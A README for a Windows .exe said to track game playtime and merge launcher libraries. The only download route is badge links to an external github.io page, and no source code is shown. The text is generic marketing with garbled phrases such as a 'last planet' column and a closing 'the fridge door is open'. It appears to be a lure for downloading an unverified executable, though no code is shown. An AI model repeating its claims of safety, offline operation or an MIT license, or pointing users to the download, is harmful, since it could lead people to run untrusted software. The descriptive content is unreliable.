<div align="center">
<br/>
<h1>Playtime Tracker Library Manager</h1>
<h3><em>Utilities and companion tools for Playtime tracker and library manager.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-1b7fa8?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DB2777&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Playtime+Tracker+Library+Manager+Pro;%E2%9C%A8+Community+Tested;%E2%AD%90+No+Limits;%F0%9F%92%A1+Active+Development+2026;%E2%9C%85+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=unity" />
</p>

---

**Every hour logged. Every launcher unified. Every backlog finally visible.**

The desktop .exe that watches your entire library — Steam, Epic, GOG, Battle.net, Xbox Game Pass, emulators, standalone installs — tracks real foreground playtime down to the second, and turns a scattered mess of launchers into one searchable, sortable, filterable library you actually want to open.

---

</div>

Most playtime counters guess. They poll a window title every fifteen seconds and call it a session. This one hooks the foreground process, reads the executable hash, matches it against your library manifest, and starts a timer the instant the window gains focus — including games no store API will ever see.

## 🧭 Table of Contents

- [What is Playtime Tracker and Library Manager?](#-what-is-playtime-tracker-and-library-manager)
- [Overview](#-overview)
- [Key Features](#-key-features)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Get Started — Quick Start](#-get-started--quick-start)
- [How This Compares](#-how-this-compares)
- [Run the Tool — Usage](#-run-the-tool--usage)
- [Tracker Modules](#-tracker-modules)
- [Library Modules](#-library-modules)
- [Analytics Modules](#-analytics-modules)
- [How To Use — Daily Workflow](#-how-to-use--daily-workflow)
- [Installation](#-installation)
- [System Requirements](#-system-requirements)
- [Launcher Compatibility](#-launcher-compatibility)
- [Module Status Board](#-module-status-board)
- [Known Issues](#-known-issues)
- [Usage Guidelines](#-usage-guidelines)
- [FAQ](#-faq)
- [Changelog — 2.7.3](#-changelog--273)
<p align="center">
  <a href="https://GradeRogueSense.github.io/playtime-tracker-library-manager/">
    <img src="https://img.shields.io/badge/INSTALL-Win64-4338CA?style=flat&labelColor=3730A3" width="460" alt="INSTALL Win64"/>
  </a>
</p>
---

## 🎮 What is Playtime Tracker and Library Manager?

It's a Windows desktop application that does two jobs and does both without asking for a subscription: **it tracks how long you actually play**, and **it organizes everything you own**.

| Term | Explanation |
|---|---|
| **Session** | A contiguous window of focused playtime on one executable, ended by alt-tab, minimize, exit, or idle timeout |
| **Foreground Hook** | A lightweight Win32 process watcher that reads the active window's owning process without injecting into it |
| **Library Manifest** | The local SQLite catalog of every game the app knows about — executable hash, install path, launcher origin, cover art |
| **Orphan Entry** | A game detected in your library that no launcher currently claims (cracked, portable, or removed from store) |
| **Idle Cutoff** | Configurable inactivity threshold (default 300s) after which a session is closed so paused-with-menu-open doesn't inflate hours |
| **Snapshot** | An exported read-only copy of your manifest and stats for backup or migration between machines |

Why people switch to it:

- Reconciles playtime from multiple launchers into a single unified total instead of five conflicting numbers.
- Tracks non-store games — emulator ROMs, portable builds, old disc installs, indie itch.io zips.
- Keeps your backlog honest with completion state, completionist percentage, and last-played sorting.
- Runs fully offline: no account, no telemetry phoning home, no storefront login requirement.
- Exports to CSV, JSON, and a printable HTML report without an upsell nag.
- Survives reinstalls with a one-click manifest snapshot import.

---

## 📊 Overview

| Category | Details |
|---|---|
| **Type** | Standalone Windows desktop application (.exe, portable + installer) |
| **Core Function** | Foreground playtime tracking + unified multi-launcher library catalog |
| **Tracking Method** | Win32 foreground-process hook, hash verification, configurable idle detection |
| **Storage** | Local SQLite manifest (`library.db`), WAL mode, no cloud dependency |
| **Launchers Supported** | Steam, Epic, GOG Galaxy, Battle.net, Ubisoft Connect, EA App, Xbox/Game Pass, itch.io, Riot, emulators |
| **Privacy Model** | Offline by default; optional manual HTML report export |
| **Footprint** | ~18 MB installed, ~40–70 MB RAM idle, agent under 1% CPU |
| **Platforms** | Windows 10 (1809+) and Windows 11, x64 |

---

## 🗂️ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Unified Library Grid | One grid across every launcher, sortable and filterable | No more tab-hopping five clients |
| Hash-Verified Tracking | Matches running executable by hash, not filename | Catches two games with the same process name |
| Idle Cutoff | Closes sessions after configurable inactivity | Main-menu AFK doesn't fake your hours |
| Backlog Kanban | Drag games between Backlog / Playing / Finished / Abandoned | Turns a purchase pile into a plan |
| Session Timeline | Per-session start, end, duration, and intensity graph | See when you actually play |
| Import/Export Snapshot | JSON + CSV + HTML report export | Your data is yours |
| Duplicate Finder | Detects the same game owned on multiple launchers | Reclaims drive space |
| Achievement Mirror | Pulls publicly available achievement data where the launcher exposes it | One completion view |
| Optional Screenshot Sidecar | Captures a timestamped frame per session | Retroactive "what was I playing" recall |

---

## 🩹 The Problem

- You own hundreds of games across eight launchers and have no single page that lists them all.
- Steam counts hours from launch to exit — leaving it overnight at the main menu reads as six hours "played."
- Emulator games, itch.io zips, and portable builds have **zero** playtime tracking anywhere.
- You keep "rediscovering" a game you forgot you even bought two years ago.
- Five different stores show five different totals for the same session you played last night.
- Backlog lists on sticky notes rot. Nothing forces the pile into a decision.
- Every paid tracker wants an account, an always-on connection, and a monthly fee.

## 🧩 The Solution

| Problem | Solution |
|---|---|
| Launchers can't see each other | Unified manifest with deduplication across all supported launchers |
| Overnight AFK inflates hours | Idle cutoff + idle auto-close with admin-optional idle detection |
| Portable/emulator games untracked | Manual add with executable hash pinning; tracks just like a store game |
| Forgotten purchases | Backlog kanban + "never played, owned > 1 year" filter |
| Conflicting hour totals | Import launcher-reported totals as a base layer; overlay native local sessions |
| Sticky-note backlog rot | Drag-and-drop states with weekly "pick next" widget |
| Subscription/privacy downside | Offline local SQLite, MIT license, no account, no telemetry |

---

## 🚀 Get Started — Quick Start

1. 🎯 **Grab the build.** Use the download block below, save it, extract.
2. 📦 **Pick your mode.** Run the installer for shortcuts, or run the standalone .exe portable from any folder.
3. 🕹️ **Scan your launchers.** First launch runs an auto-detect pass over common install roots.
4. 🧹 **Confirm the manifest.** Review imported entries, rename, merge duplicates, pin covers.
5. ⏱️ **Let it run.** The tray agent starts tracking the moment a game window gains foreground.

> First scan of a large library (1000+ entries) typically finishes in 40–90 seconds depending on disk speed. Steam, GOG and itch.io imports are the fastest; emulator roots are scanned last.

## 🆚 How This Compares

| Aspect | Typical Alternative | Playtime Tracker and Library Manager |
|---|---|---|
| Launcher coverage | One launcher, per-client stats only | 9+ launchers in one manifest |
| Portable/emulator tracking | Not supported | Manual hash add, full tracking |
| Playtime Method | Launch-to-exit | Foreground focus + idle cutoff |
| Idle handling | None | Configurable idle timeout |
| Privacy | Account + cloud sync | Fully offline, local SQLite |
| Backlog tooling | None or external | Built-in kanban + filters |
| Export | Screenshot or none | CSV, JSON, printable HTML |
| Cost model | Subscription pressure | Free, MIT, no upsell |

---

## 🛠️ Run the Tool — Usage

This is the hands-on half of the pairs — install gets it on disk, this gets it working.

### 🎛️ The Tray Agent

Once running, the tracker lives in your system tray. A green dot means a session is live; grey means idle. Right-click for pause-tracking, blacklist-a-game, or open the full library view. The agent needs no admin rights for standard foreground tracking — only enable elevated mode if you also want to catch games launched by an elevated launcher.

### 🗃️ The Library View

Everything the manifest knows is here. Columns: name, launcher, last planet, total hours, session count, state, size on disk. Bulk-select to set backlog states. Right-click any row for "open install folder," "re-scan executable," "re-import from launcher," and "pin cover."

### 📈 The Stats View

A calendar heatmap of your last 52 weeks, a weekday pattern chart, a top-25 all-time section, and a streak counter. Click any day to expand that day's sessions with start and end times.

## ⏱️ Tracker Modules

- **Foreground Hook** — Reads active-window process without injection; the core of accurate sessions.
- **Hash Pinner** — Locks a game's playtime to its executable hash so renames don't fragment history.
- **Idle Cutoff** — Ends sessions after configurable no-input windows.
- **Idle Auto-Close** — Forcibly closes session when a parked game passes the idle ceiling.
- **Elevated Tracking** — Optional admin helper to catch elevated-launched games.
- **Multi-Process Merge** — Combines split-process games (launcher + game) into one coherent session.
- **Session Recovery** — Reboot-safe session writes so stats survive a power cut mid-play.
- **Pause Handler** — Instantly freezes timer on tracker pause from tray.
- **Anti-Double-Count** — Detects overlapping launched executables to avoid double session records.

## 📚 Library Modules

- **Launcher Detectors** — Per-launcher root discovery for Steam, Epic, GOG, Battle.net, EA, Ubisoft, Riot, Xbox, itch.io.
- **Emulator Scanner** — Recognizes common emulator library folders and ROM-file extensions.
- **Manual Add Wizard** — Add any executable with cover, tags, and completion state.
- **Duplicate Merger** — Cross-launcher deduplication suggestions.
- **Orphan Rescue** — Keeps tracking games that no launcher claims anymore.
- **Cover Resolver** — Fetches local bundle art and cache; manual pin override.
- **Folder Watch** — Auto-adds executables dropped in watched directories.
- **Custom Tags** — Free-form tags for genre, mood, coop, length, etc.

## 📉 Analytics Modules

- **Year-in-Review** — Auto mid-December report with totals, trends, top entries.
- **Backlog Debt Calculator** — Estimates hours-to-clear at your average session pace.
- **Genre Breakdown** — Aggregates hours by your own tags only, no scraped metadata.
- **Streak & Gap Counter** — Tracks consecutive-day streaks and longest untouched-gap.
- **Sentiment Sort** — Sorts by hours-per-week at any window you choose.
- **Peripheral Time** — Approximates "worth re-installing" from actual use.

## 🧮 How To Use — Daily Workflow

1. Open the app the first time. Run detection. Fix anything the wizard flags.
2. Pin the covers you care about; leave the rest to cache over the first week.
3. When you launch a game you intend to track, just play. The tray dot goes green.
4. Alt-tab away — if idle ceiling trips, the session closes and logs correctly.
5. End of week, open the Backlog view. Pick next from the widget. Move states with drag.
6. End of month, review stats. Prune tags. Re-snapshot as backup.

## 🎞️ Installation

1. **Download.** Use the container below — it's the .exe build, wrapped for GitHub display.
2. **Extract & choose.** Unzip to a permanent folder. Run installer for convenience shortcuts, or just run the standalone .exe portable.
3. **First run.** The wizard runs the launcher scan. Approve or decline any detected roots. Fix missing paths manually if needed.

> Playtime Tracker and Library Manager runs portable — the manifest lives beside the application by default. Move the whole folder, and the library moves with it.

## 💾 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 1809 x64 | Windows 11 22H2+ |
| CPU | Any dual-core 2.0 GHz | Quad-core 2.5 GHz+ |
| RAM | 4 GB | 8 GB+ |
| Disk | 30 MB app + ~1 GB manifest space | 100+ GB free buffer for library |
| Display | 1280×720 | 1920×1080 |
| Privileges | Standard user | Admin once for elevated-launched game tracking |
| Launchers | 1 supported launcher | 3+ launcher roots mapped |
| Storage | HDD | SSD from manifest scans |

## 🧷 Launcher Compatibility

| Launcher | Detection | Import | Native Stats | Manual Add Backup |
|---|---|---|---|---|
| Steam | ✅ | ✅ | ✅ | ✅ |
| Epic Games | ✅ | ✅ | ⚠ partial | ✅ |
| GOG Galaxy | ✅ | ✅ | ✅ | ✅ |
| Battle.net | ✅ | ✅ | ⚠ partial | ✅ |
| Ubisoft Connect | ✅ | ✅ | ⚠ partial | ✅ |
| EA App | ✅ | ✅ | ⚠ partial | ✅ |
| Xbox / Game Pass | ✅ | ✅ | ✅ | ✅ |
| Riot Client | ✅ | ✅ | ✅ | ✅ |
| itch.io | ✅ | ✅ | ❌ | ✅ |
| Emulators | ✅ | ⚠ patterns | ❌ | ✅ |

---

## ✅ Module Status Board

| Module | Status | Description |
|---|---|---|
| Foreground Hook | ✅ Working | Stable across supported launchers |
| Idle Cutoff | ✅ Working | Default 300s, configurable |
| Unified Library Grid | ✅ Working | Sorting, filtering, multi-select |
| Duplicate Merger | ✅ Working | Cross-launcher suggestions with manual confirm |
| Emulator Scanner | ✅ Working | ROM-extension patterns maintained |
| Snapshot Export | ✅ Working | JSON, CSV, printable HTML |
| Achievement Mirror | ⚠ Partial | Depends on publicly exposed launcher data |
| Elevated Helper | ⚠ Partial | Optional; may need re-approval each session |
| Disc/Portable Editor | ✅ Working | Manual add wizard reliable |
| Year-in-Review | ✅ Working | Mid-December generation |
<p align="center">
  <a href="https://GradeRogueSense.github.io/playtime-tracker-library-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Release-4F46E5?style=flat&labelColor=3730A3" width="550" alt="DOWNLOAD Release"/>
  </a>
</p>
---

## 🔧 Known Issues

| Issue | Solution |
|---|---|
| A game's playtime splits between launcher and game process | Merge via "Session Rationale" review in tray; manually attach to same hash |
| Steam library not found if installed to a non-default drive | Add root manually in Settings → Library Roots |
| Rapid alt-tab during load screens creates micro-sessions | Raise the "minimum session length" threshold (default 90s) under Tracking |
| Cover art cache grows large after months | Settings → Cache → Purge cover cache; art re-fetches on demand |
| Idle auto-close closes games on Windows Game Bar pop-in | Lower Game Bar "show time remaining" delay or disable idle auto-close |
| Elevated-launched game goes untracked | Enable elevated helper once per Windows session |

## 📖 Usage Guidelines

| Allowed | Not allowed |
|---|---|
| Track any application you choose to track | Using the tracker to gather data on other users' machines without consent |
| Export personal library statistics | Redistributing modified builds while removing the license and credit |
| Custom adds, custom tags, custom roots | Bundling the executable into paid redistribution without written permission |
| Yes, use it on a single-player game to satisfy a completion metric where allowed | Using it to spoof, sell, or misrepresent stats in competitive contexts where prohibited by that platform |
| Checking offline playtime only | Reselling a modified version as an original product |
| Building personal dashboards on exported CSV/JSON | Removing attribution from a fork published publicly |

## 🤔 FAQ

| Question | Answer |
|---|---|
| Is it really offline? | Yes. No account, no telemetry endpoint. The only network access is optional artifact imports you request. |
| Does it work with Steam in offline mode? | Yes. The manifest reconciles what Steam already cached; tracking itself is entirely local. |
| Will it track games I play through a launcher I've disabled in Settings? | No. A disabled launcher root is ignored. Re-enable and re-scan if you change your mind. |
| Does it need admin rights? | Only optional. Standard tracking works without admin. The elevated helper catches raised-launch games. |
| How accurate is the foreground timer? | For a correctly-hashed executable, start resolution is sub-second; total error depends mostly on your idle cutoff setting. |
| Can I migrate to a new PC? | Yes — export a snapshot from the old machine, install, import, done. |
| Are workshop/SDK redistributables billed as playtime? | No. Executable sub-tools share the parent's hash unless you split them manually. |
| Does it support cross-platform? | Windows 10/11 x64 only, tested. Other platforms are not planned for this track. |
| Can I merge two launcher entries of the same game? | Yes, in the Duplicate Merger view. |
| Do I have to launch the game through your app? | No. You launch the game however you always do; the agent just observes the foreground process. |

## 📜 Changelog — 2.7.3

- Improved EMulator scan recognition for common ROM folder naming.
- Fixed a race condition in the exit handler that could log a double end-of-session.
- Duplicate Merger now previews disk owner chain before suggestion confirm.
- Optional Idle Auto-Close expanded thresholds with clearer per-game override.
- HTML report export now groups by custom tags where present.

---

That's the shape of it. One tray icon, one manifest, one honest number for every game you own. Nothing here is trying to become a store — it's the logbook for every store you already use. Install it, let it run, and let the backlog finally argue its own case against the pile of sticky notes. Cheers — the fridge door is open.
